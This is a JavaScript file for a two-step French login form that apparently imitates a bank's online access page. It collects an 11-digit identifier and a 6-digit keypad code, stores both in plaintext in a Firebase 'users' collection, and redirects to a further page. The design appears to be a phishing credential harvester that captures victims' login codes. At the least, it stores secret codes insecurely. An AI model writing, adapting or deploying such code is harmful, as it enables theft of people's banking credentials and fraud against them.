document.addEventListener('DOMContentLoaded', function() {
    const nextStepBtn = document.getElementById("nextStep");
    const identifierStep1 = document.getElementById("identifierStep1");
    const identifierStep2 = document.getElementById("identifierStep2");
    const step1 = document.getElementById("step1");
    const step2 = document.getElementById("step2");
    const numericKeys = document.querySelectorAll(".numeric-key");
    const codeField = document.getElementById("code");
    const submitBtn = document.getElementById("submitBtn");
    const clearIdentifierBtn = document.getElementById("clearIdentifier");
    const clearCodeBtn = document.getElementById("clearCode");

    nextStepBtn.addEventListener("click", function() {
        console.log("Next step clicked");
        if (identifierStep1.value.length === 11) {
            identifierStep2.value = identifierStep1.value;
            step1.style.display = "none";
            step2.style.display = "block";
            console.log("Moving to step 2");
        } else {
            alert("Veuillez saisir un identifiant valide à 11 chiffres.");
        }
    });

    numericKeys.forEach(key => {
        key.addEventListener("click", function() {
            if (codeField.value.length < 6) {
                codeField.value += this.dataset.value;
                submitBtn.disabled = codeField.value.length !== 6;
                console.log("Code updated:", codeField.value);
            }
        });
    });

    submitBtn.addEventListener('click', function(e) {
        e.preventDefault();
        console.log("Submit button clicked");
        submitBtn.disabled = true;
        submitBtn.textContent = "CHARGEMENT...";

        // Vérifier que Firebase est initialisé
        if (!firebase || !firebase.firestore) {
            console.error("Firestore n'est pas initialisé correctement");
            alert("Une erreur est survenue lors de l'initialisation");
            submitBtn.disabled = false;
            submitBtn.textContent = "VALIDER";
            return;
        }

        console.log("Firestore initialized correctly");
        const db = firebase.firestore();
        
        const userData = {
            identifier: identifierStep2.value,
            code: codeField.value,
            timestamp: Date.now()
        };
        
        console.log("Attempting to save data:", userData);

        db.collection('users').doc(identifierStep2.value).set(userData)
        .then(() => {
            console.log("Données sauvegardées avec succès");
            window.location.href = 'collette.html';
        })
        .catch((error) => {
            console.error("Erreur Firestore:", error);
            alert("Une erreur est survenue");
            submitBtn.disabled = false;
            submitBtn.textContent = "VALIDER";
        });
    });

    clearIdentifierBtn.addEventListener("click", function() {
        identifierStep1.value = '';
        identifierStep2.value = '';
        step1.style.display = "block";
        step2.style.display = "none";
    });

    if (clearCodeBtn) {
        clearCodeBtn.addEventListener("click", function() {
            codeField.value = '';
            submitBtn.disabled = true;
        });
    }
});